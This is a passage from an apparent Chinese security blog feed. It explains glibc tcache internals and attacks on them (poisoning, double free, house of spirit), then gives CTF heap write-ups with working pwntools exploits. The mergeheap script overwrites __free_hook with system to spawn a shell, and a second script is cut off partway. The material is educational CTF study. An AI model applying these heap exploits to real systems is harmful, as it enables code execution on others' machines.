e<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取出后链表的补齐</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获得一个 chunk，counts 减一</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们可以看出其检查很弱，差不多算是<strong>tcache-&gt;entries[tc_idx] = e-&gt;next;</strong>这个注意点，意思差不多就是free的tcache里面next指针要存在，不过也可以伪造。</p><p>如果没有链表里没有合适的tcache,那么于之前libc的操作类似，不过这样我们看出tcache的优先级，源码中先对其进行判断。</p><h3 id="tcache机制带来的内存分配变化"><a href="#tcache机制带来的内存分配变化" class="headerlink" title="tcache机制带来的内存分配变化"></a>tcache机制带来的内存分配变化</h3><p>malloc时会把内存块移入tcache</p><ol><li>首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</li><li>其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。</li><li>当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</li></ol><h1 id="tcache-所带来的的相关攻击方式"><a href="#tcache-所带来的的相关攻击方式" class="headerlink" title="tcache 所带来的的相关攻击方式"></a>tcache 所带来的的相关攻击方式</h1><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>伪造next指针就可以任意地址读写，修改之后，两次malloc就可以把相应堆块拿出来。</p><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h3><p><strong>适用于libc2.27 2.26,但是2.29出现了相关检查，2.28还不太清楚奥</strong><br>我们从上面的源码可以知道tcache_put()也没有什么检查，算是判断了一下idx是否合法，那么就可以直接double free，而且不需要想fastbin里面那样担心fasttop的检查</p><h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p><strong>tcache_perthread_struct</strong>管理tcache结构，它还是个堆块，那么我们之前说的任意地址读写也可以用来控制这个堆块。</p><h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h3><p>类似于之前glibc的house of spirit，不过更加简单，因为你只需要寻找两个相邻的内存单元，伪造出size和next指针，直接free操作，就可以实现对应大小对应地址堆块的控制。</p><h3 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h3><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。这个的意思就是之前的unlink不需要绕过链表中对应堆块是否正确的检查了，更加简单，威力也更大了。</p><h3 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h3><p>和之前的unsorted bin attack大部分一样，不过要先把对应的tcache消耗完</p><h3 id="Tcache-Check-相关影响写到了tcache-dup里面"><a href="#Tcache-Check-相关影响写到了tcache-dup里面" class="headerlink" title="Tcache Check 相关影响写到了tcache dup里面"></a>Tcache Check 相关影响写到了tcache dup里面</h3><p>这个其实就是使得tcache dup操作失效了。</p><pre class=" language-c"><code class="language-c">index 6d7a6a8<span class="token punctuation">.</span><span class="token punctuation">.</span>f730d7a <span class="token function">100644</span> <span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token operator">--</span><span class="token operator">-</span> a<span class="token operator">/</span>malloc<span class="token operator">/</span>malloc<span class="token punctuation">.</span>c<span class="token operator">++</span><span class="token operator">+</span> b<span class="token operator">/</span>malloc<span class="token operator">/</span>malloc<span class="token punctuation">.</span>c@@ <span class="token operator">-</span><span class="token number">2967</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token operator">+</span><span class="token number">2967</span><span class="token punctuation">,</span><span class="token number">8</span> @@ <span class="token function">mremap_chunk</span> <span class="token punctuation">(</span>mchunkptr p<span class="token punctuation">,</span> size_t new_size<span class="token punctuation">)</span> <span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_entry <span class="token punctuation">{</span>   <span class="token keyword">struct</span> tcache_entry <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token operator">+</span>  <span class="token comment" spellcheck="true">/* This field exists to detect double frees.  */</span><span class="token operator">+</span>  <span class="token keyword">struct</span> tcache_perthread_struct <span class="token operator">*</span>key<span class="token punctuation">;</span> <span class="token punctuation">}</span> tcache_entry<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* There is one of these for each thread, which contains the@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx) {   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);   assert (tc_idx &lt; TCACHE_MAX_BINS);++  /* Mark this chunk as "in the tcache" so the test in _int_free will+     detect a double free.  */</span><span class="token operator">+</span>  e<span class="token operator">-></span>key <span class="token operator">=</span> tcache<span class="token punctuation">;</span><span class="token operator">+</span>   e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>   tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>   <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@@ <span class="token operator">-</span><span class="token number">3005</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token operator">+</span><span class="token number">3012</span><span class="token punctuation">,</span><span class="token number">7</span> @@ <span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span>   <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>   <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span>  e<span class="token operator">-></span>key <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span> <span class="token punctuation">}</span>@@ <span class="token operator">-</span><span class="token number">4218</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token operator">+</span><span class="token number">4226</span><span class="token punctuation">,</span><span class="token number">26</span> @@ <span class="token function">_int_free</span> <span class="token punctuation">(</span>mstate av<span class="token punctuation">,</span> mchunkptr p<span class="token punctuation">,</span> <span class="token keyword">int</span> have_lock<span class="token punctuation">)</span>   <span class="token punctuation">{</span>     size_t tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span>    <span class="token comment" spellcheck="true">/* Check to see if it's already in the tcache.  */</span><span class="token operator">+</span>    tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">+</span>    <span class="token comment" spellcheck="true">/* This test succeeds on double free.  However, we don't 100%+       trust it (it also matches random payload data at a 1 in+       2^&lt;size_t> chance), so verify it's not an unlikely coincidence+       before aborting.  */</span><span class="token operator">+</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> tcache <span class="token operator">&amp;&amp;</span> tcache<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>      <span class="token punctuation">{</span><span class="token operator">+</span>       tcache_entry <span class="token operator">*</span>tmp<span class="token punctuation">;</span><span class="token operator">+</span>       <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_tcache_double_free<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span>tmp <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">+</span>            tmp<span class="token punctuation">;</span><span class="token operator">+</span>            tmp <span class="token operator">=</span> tmp<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token operator">+</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp <span class="token operator">==</span> e<span class="token punctuation">)</span><span class="token operator">+</span>           <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"free(): double free detected in tcache 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span>       <span class="token comment" spellcheck="true">/* If we get here, it was a coincidence.  We've wasted a few+          cycles, but don't abort.  */</span><span class="token operator">+</span>      <span class="token punctuation">}</span><span class="token operator">+</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache        <span class="token operator">&amp;&amp;</span> tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins        <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span></code></pre><p>相关例题可以看看我的<strong>2020_heap_practice</strong>博文里面的2018LCTF eaay_heap</p><p>相关参考：</p><blockquote><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache-zh/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020_heap_practice</title>
      <link href="/2020/01/30/2020-heap-practice/"/>
      <url>/2020/01/30/2020-heap-practice/</url>
      
        <content type="html"><![CDATA[<h3 id="2019护网杯-mergeheap"><a href="#2019护网杯-mergeheap" class="headerlink" title="2019护网杯 mergeheap"></a>2019护网杯 mergeheap</h3><p>这个题目的逻辑比较清晰，难的地方在于利用思路。</p><p>遍观整个程序：</p><p>自己实现的read函数没有off-by-one:<br><img src="/2020/01/30/2020-heap-practice/image-20200116214646455.png" title="This is an image"></p><p>delete函数没有UAF之类的<br><img src="/2020/01/30/2020-heap-practice/image-20200116214711245.png" title="This is an image"></p><p>因此整个程序没有什么明显的漏洞，下面就要对执行逻辑进行分析。</p><p>首先我们要看merge函数（其实看题目名字也大致猜到这里可能有问题）<br><img src="/2020/01/30/2020-heap-practice/image-20200116214903733.png" title="This is an image"></p><p>strcpy和strcat都以”\x00”截止，那么结合自己实现read函数，如果size刚好都填充满堆块的话，两个堆块合并可以溢出两个字节，但是我们只需要溢出一个改变其下一个堆块的size位就可以了，然后我们利用chunk overlap来实现利用。</p><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>首先当然是地址泄露，对于libc 2.27的堆题目，我们要消耗掉teache，然后得到unsorted bin来实现地址泄露，得到地址后，就可以利用merge处的漏洞，实现getshell</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>exec_binary <span class="token operator">=</span> <span class="token string">"./mergeheap"</span>libcversion <span class="token operator">=</span> <span class="token string">'2.27'</span>local <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binarycontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span>    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"i386"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x86/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"amd64"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x64/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base <span class="token operator">=</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>_cwd<span class="token operator">+</span>r<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"libc.so.6"</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>            <span class="token keyword">return</span> text_base<span class="token punctuation">,</span>r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base<span class="token punctuation">,</span>libc_base <span class="token operator">=</span> get_base<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    break_point <span class="token operator">=</span> <span class="token string">"set $text_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>text_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token operator">+</span><span class="token string">"set $libc_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>    break_point<span class="token operator">+=</span><span class="token string">"b *"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nc"</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span>break_point<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">" ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"len:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>idx1<span class="token punctuation">,</span>idx2<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"idx1:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx1<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"idx2:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    malloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    free<span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">-</span>i<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 反向free可以减少一个堆块的消耗，同时方便show</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>malloc<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0  这里只能是8或者更小，因为输入的size要刚好等于要输入的数据长度，这样的话就不会出现末尾补0，进而下面的输出不会被阶段</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>get <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> get <span class="token operator">-</span> <span class="token number">0x3afda0</span>free_hook <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>confirm<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>malloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#3</span>malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#4</span>malloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#5</span>malloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#6</span>free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>merge<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#这几步总的来说就是在一个大堆块里面申请了一个小堆块，free掉小堆块和大堆块，然后把大堆块申请出来，然后就可以修改小堆块的link list，进而实现任意地址写。</span>malloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#7 </span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#7</span>malloc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>对于teache，它和fastbin不太一样，fastbin进行chunk_overlap的时候一般申请堆块大小为0x70,因为在mallc_hook，或者free_hook附近错位找合适堆块size的时候一般都是0x7f，但是teache的地址就比较宽松，可以直接把free_hook之类的地址写进它的link_list里面</p><h3 id="网络内生安全试验场-pwn1"><a href="#网络内生安全试验场-pwn1" class="headerlink" title="网络内生安全试验场 pwn1"></a>网络内生安全试验场 pwn1</h3><p>这个题目算是比较简单的，考的是double free的利用，和__std_out的地址泄露。</p><p>它的堆块存储结构大概是这样子的。<br><img src="/2020/01/30/2020-heap-practice/image-20200117115725354.png" title="This is an image"></p><p>同时它进项堆块内存读取的时候是全部输出。<br><img src="/2020/01/30/2020-heap-practice/image-20200117115758293.png" title="This is an image"></p><p>我们调试可以发现 unsorted bin attack泄露地址是很难的，那我们就瞄准输入输出流.<br><img src="/2020/01/30/2020-heap-practice/image-20200117115907712.png" title="This is an image"></p><p>程序中存在double free漏洞，那么我们可以创造堆块来使得地址泄露吗，然后再次利用堆块任意写实现利用</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcherexec_binary <span class="token operator">=</span> <span class="token string">"./pwn1"</span>libcversion <span class="token operator">=</span> <span class="token string">'2.23'</span>local <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binary<span class="token comment" spellcheck="true">#context.log_level = "debug"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span>    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"i386"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x86/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"amd64"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x64/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc<span class="token punctuation">,</span>libcbase    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>    libcbase <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base <span class="token operator">=</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>_cwd<span class="token 